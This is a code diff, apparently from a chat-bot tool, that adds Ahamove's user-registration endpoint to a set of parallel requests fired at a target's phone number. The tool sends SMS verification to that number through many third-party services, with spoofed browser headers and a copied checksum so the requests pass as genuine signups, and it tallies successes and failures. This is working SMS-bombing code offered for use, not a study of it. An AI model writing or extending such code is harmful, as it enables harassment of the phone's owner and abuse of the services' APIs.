@@ -530,6 +530,30 @@ const payload = {
           country_code: 'VN',
           client_id: 'vKyPNd1iWHodQVknxcvZoWz74295wnk8',
         };
+
+    const ahamoveHeaders = {
+          'authority': 'api.ahamove.com',
+          'accept': 'application/json, text/plain, */*',
+          'accept-language': 'en-US,en;q=0.9,vi;q=0.8',
+          'content-type': 'application/json;charset=UTF-8',
+          'dnt': '1',
+          'origin': 'https://app.ahamove.com',
+          'referer': 'https://app.ahamove.com/',
+          'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+          'sec-ch-ua-mobile': '?0',
+          'sec-ch-ua-platform': '"Windows"',
+          'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        };
+
+        const ahamoveData = {
+          mobile: phone.substring(1, 9), // Adjusting the phone format
+          name: 'hoang',
+          email: 'bohoangdz@gmail.com',
+          country_code: 'VN',
+          firebase_sms_auth: true,
+          time: Math.floor(Date.now() / 1000), // Current time in seconds
+          checksum: 'H5orYHI463TcARZHf6xyU/lyv4+lx3w68FS1zNXx0Cx9gaj2npSXuh2aKSCVfR44cTSPPumj1ECww4Rlvn7hcEYP4RtrY8JZicv4ZPpWnxxyvS3NOuyPxOo64PatsAf8+dnEn09D0llQoq8FlD6tQfZ06bn9b5Ug1ZRakqndxdA4D4Y03bcXeraizM7P5EHkNzMebCIjOxANDSh8ODEqLBhmgKrkKSZT2Nl3ObWPQuhY0dO5xp7zW4zaBNbkD+JlvyewhsD9mN4pPxoambo2LfpXwDQthi04i/UKqEy+QtoM0bVkYypsUA1QiFvt+tKSSPf2C1qCJv5xJqUYehjiUg==',
+        };
             
 
     // Initial message to be edited later
@@ -604,13 +628,14 @@ const payload = {
           fptData,
           { headers: fptHeaders }
         ), 
+        axios.post('https://api.ahamove.com/api/v3/public/user/register', ahamoveData, { headers: ahamoveHeaders }), 
         ])
       .then(() => {
-        successCount += 16;
+        successCount += 20;
         updateMessage();
       })
       .catch(() => {
-        failureCount += 16;
+        failureCount += 20;
         updateMessage();
       });
     };
